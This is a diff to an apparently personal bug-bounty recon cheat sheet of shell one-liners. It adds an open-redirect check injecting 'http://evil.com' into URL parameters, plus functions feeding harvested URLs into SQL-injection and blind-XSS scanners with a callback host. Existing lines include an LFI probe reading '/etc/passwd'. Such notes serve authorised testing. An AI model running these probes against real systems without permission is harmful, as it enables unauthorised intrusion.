@@ -2,7 +2,6 @@ Nuclei Command
 ~ > nuclei -a ransomsec -target /tmp/dangerous-shell.sh
 ~ > nuclei -l ./targets.txt -t ./CVE-2022-35405.yaml
 
-
 FFUF Command
 ~ > ffuf -u https://codingo.io/FUZZ -w ./wordlist -recursion -e .bak
 ~ > ffuf -u https://rendering-prd.redacted.com/FUZZ -w english-words.txt -mc all -fw 6
@@ -23,6 +22,12 @@ HTTPX Command
 Local File Inclusion : by @dwisiswant0
 ~ > gau HOST | gf lfi | qsreplace "/etc/passwd" | xargs -I% -P 25 sh -C 'curl -s "%" 2>&1 | grep -q "root:x" && echo "VULN! %"'
 
+Waybackurls command
+~ > waybackurls example.com | grep -a -i \=http | bhedak ' http://evil.com' | while read host do; do curl -s 
+-L $ host -I | grep "evil.com" && echo -e "$host \033[0;31mVulnerable\n" ;done
+
+# Search JS using Gau + grep
+~ > gau -subs DOMAIN | grep -iE '\.js' | grep -iEv '(\.jsp|\.json)' >> js-output.txt
 
 
 -------------------------------------------------------------------------------------
@@ -42,6 +47,26 @@ sort -u domains_$1 -o domains_$1
 cat domains_$1 | filter-resolved | tee -a domains_$1.txt
 ----------------------------------------------------------------------------------------
 
+---------------------------------------------------------------------------------------
+# ReconTwo # 2
+
+gauq() {
+  gau $1 -subs | \
+  grep "=" | \
+  cgrep -iv ".(jpg|jpeg|gif|css|tif|tiff|png|ttf|woff|woff2|ico|pdf|svg|txt|js)" | \
+  qsreplace -a
+}
+
+sqliz() {
+  gauq $1 | python3 $HOME/Tools/DSSS/dsss.py
+}
+
+bxss() {
+  BLIND="https://your.xss.ht"
+  gauq $1 | kxss | grep -Eo "(http|https)://[a-zA-Z0-9./?=_-]*" | \
+  dalfox pipe -b $BLIND
+}
+--------------------------------------------------------------------------------------------
 
 
 
